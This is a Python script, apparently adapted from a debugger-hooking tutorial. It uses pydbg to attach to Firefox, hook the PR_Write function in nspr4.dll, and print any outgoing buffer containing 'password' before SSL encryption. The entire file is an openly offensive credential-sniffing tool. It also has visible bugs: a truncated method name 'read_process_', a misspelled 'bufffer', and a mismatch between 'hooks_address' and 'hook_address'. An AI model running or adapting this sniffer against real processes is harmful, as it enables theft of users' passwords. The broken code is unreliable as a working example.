from pydbg import *
from pydbg.defines import *

import utils
import sys

dbg = pydbg()
found_firefox = False

# Paramenter of patten to find
patter = "password"

# hook callback function 
def ssl_sniff(dbg, args):
	# Read out the memory pointed
	# it is stored as an ASCII string, wo we will loop on
	# a read until we reach a NULL byte
	buffer = ""
	offset = 0
	
	while 1:
		byte = dbg.read_process_(args[1] + offset, 1)
		if byte != "\x00":
			buffer += byte
			offset += 1
			continue 
		else:
			break
	if patter in bufffer:
		print("Pre-Encrypted: %s" %(buffer))
	return DBG_CONTINUE

 # Quick and dirty process enumeration to find firefox.exe
 
for (pid, name) in dbg.enumerate_processes():
	if name.lower() == "firefox.exe":
		found_firefox = True
		hooks = utils.hook_container()
		 
		dbg.attach(pid)
		print("[*] Attaching to firefox.exe with PID: %d" % (pid))
		 
		hooks_address = dbg.func_resolve_debuggee("nspr4.dll", "PR_Write")
		# Function address
		if hooks_address:
			# Add the hook to the container. We are not instested
			# is using an exit callback, so we set it to None.
			hooks.add(dbg, hook_address, 2, ssl_sniff,None)
			print("[*] nspr4.PR_Write hooked at: 0x%08x" % (hook_address))
			break
		else:
			print("[*] Error: Could not resolve hook address")
			sys.exit(-1)
if found_firefox:
	print("[*] Hooks set, continuing process")
	dbg.run()
else:
	print("[*] Error: could not the firefox.exe process")
	sys.exit(-1)
			 
